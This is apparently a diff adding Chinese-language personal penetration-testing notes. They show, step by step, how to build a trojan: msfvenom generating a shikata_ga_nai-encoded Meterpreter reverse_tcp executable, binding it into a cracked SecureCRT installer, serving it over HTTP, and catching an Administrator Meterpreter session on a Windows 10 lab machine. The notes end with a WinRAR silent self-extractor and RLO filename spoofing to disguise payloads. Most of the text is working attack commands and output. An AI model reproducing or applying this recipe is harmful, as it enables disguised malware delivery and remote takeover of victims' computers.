@@ -151,3 +151,211 @@ go version go1.23.3 linux/amd64
                                                                              
 ┌──(root💀tyza66)-[~]
 └─# 
+
+然后我们要用到一个bind程序
+传上去之后给权限
+┌──(root💀tyza66)-[~]
+└─# cd /home
+                                                                                                                           
+┌──(root💀tyza66)-[/home]
+└─# chmod -x binding
+                                                                                                                           
+┌──(root💀tyza66)-[/home]
+└─# ls
+binding  dvwa.pcap  external.zip  tyza66
+                                                                                                                           
+┌──(root💀tyza66)-[/home]
+└─# 
+
+之后我们先用msf生成恶意程序
+
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o msf.exe
+
+┌──(root💀tyza66)-[~]
+└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o msf.exe
+Found 1 compatible encoders
+Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+x86/shikata_ga_nai succeeded with size 408 (iteration=1)
+x86/shikata_ga_nai succeeded with size 435 (iteration=2)
+x86/shikata_ga_nai succeeded with size 462 (iteration=3)
+x86/shikata_ga_nai succeeded with size 489 (iteration=4)
+x86/shikata_ga_nai succeeded with size 516 (iteration=5)
+x86/shikata_ga_nai succeeded with size 543 (iteration=6)
+x86/shikata_ga_nai succeeded with size 570 (iteration=7)
+x86/shikata_ga_nai succeeded with size 597 (iteration=8)
+x86/shikata_ga_nai succeeded with size 624 (iteration=9)
+x86/shikata_ga_nai chosen with final size 624
+Payload size: 624 bytes
+Final size of exe file: 73802 bytes
+Saved as: msf.exe
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# 
+
+不是编码次数越多编码能力越强
+先看一下binding的用法
+┌──(root💀tyza66)-[~]
+└─# ls                              
+服务器账密.txt  视频  下载  aircrack_8812au  hello.txt
+公共            图片  音乐  bak.xml          home
+模板            文档  桌面  Desktop          msf.exe
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# cd /home
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# ,.binding
+,.binding：未找到命令
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# ,/binding
+zsh: 没有那个文件或目录: ,/binding
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# ./binding
+zsh: 权限不够: ./binding
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# chmod -x binding
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# ./binding       
+zsh: 权限不够: ./binding
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# chmod 777 binding
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# ./binding        
+
+使用方法：chmod +x binding                                                   
+命令参数：./binding -m 木马文件 -s 正常文件 -i icon图标 -p 文件释放路径      
+-p    可选参数，指定文件释放路径，默认路径: C:\\Users\\Public\\              
+绑定后的exe文件会生成在output目录中。                                        
+┌──(root💀tyza66)-[/home]
+└─#  ./binding -m ~/msf.exe -s /home/SecureCRT-kg.exe -i /home/SecureCRT-kg.ico -p C:\\windows\\temp\\
+
+
+output file: output/payload.exe successed!!! 
+
+注意/p指定的路径必须是系统存在的  
+
+ mac arm 的 bingding 用这个 binding-linux-arm64，另外 msf 生成 exe 的时候
+不要指定架构。
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53
+LPORT=4444 -f exe -o msf.exe
+下载到本地，注意关闭杀软，msf 生成的 exe 文件会报毒。
+└─# sz output/payload.exe
+
+之后去看看
+┌──(root💀tyza66)-[/home]
+└─# ls
+binding    external.zip  SecureCRT-kg.exe  tyza66
+dvwa.pcap  output        SecureCRT-kg.ico
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# cd output 
+                                                                             
+┌──(root💀tyza66)-[/home/output]
+└─# ls
+payload.exe
+
+我们可以用py在当前目录开个http服务之后下载
+                                                                             
+┌──(root💀tyza66)-[/home/output]
+└─# cd /home
+                                                                             
+┌──(root💀tyza66)-[/home]
+└─# python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+我发现我的程序没有图标也打不开 重新弄一下包
+
+┌──(root💀tyza66)-[~]
+└─# pwd                       
+/root
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# ./binding -m msf.exe -s SecureCRT-kg.exe -i SecureCRT-kg.ico -p C:\\windows\\temp\\ 
+output file: output/payload.exe successed!!!                                                                             
+┌──(root💀tyza66)-[~]
+└─# python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+下载过去之后可以伪装一下
+之后我们回kali 启动一下监听 那边设置的是什么payload 这边就设置什么
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > options
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, pro
+                                        cess, none)
+   LHOST     192.168.101.53   yes       The listen address (an interface may be specif
+                                        ied)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+之后run就开始监听了
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+
+之后回到win10使用问题程序
+
+这时会发现终端来了
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] Sending stage (176198 bytes) to 192.168.101.111
+[*] Meterpreter session 4 opened (192.168.101.53:4444 -> 192.168.101.111:49693) at 2025-02-17 15:11:48 +0800
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > getuid
+Server username: DESKTOP-ASI6V22\Administrator
+meterpreter > 
+
+
+这样就利用成功了
+接下来试一下winrar捆绑恶意程序之后上线
+先生成一个木马程序
+┌──(root💀tyza66)-[~]
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.101.53 LRPORT=4444 -f exe -o /var/www/html/dongman.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: /var/www/html/dongman.exe
+
+开启一下apache 好方便被下载
+┌──(root💀tyza66)-[~]
+└─# systemctl start apache2    
+                                                                             
+将文件下载到windows 之后使用winrar打包自解压程序 并静默且更换图标
+可以使用RLO伪装一下
+然后来可以再最左侧插入LRO
+
+
+
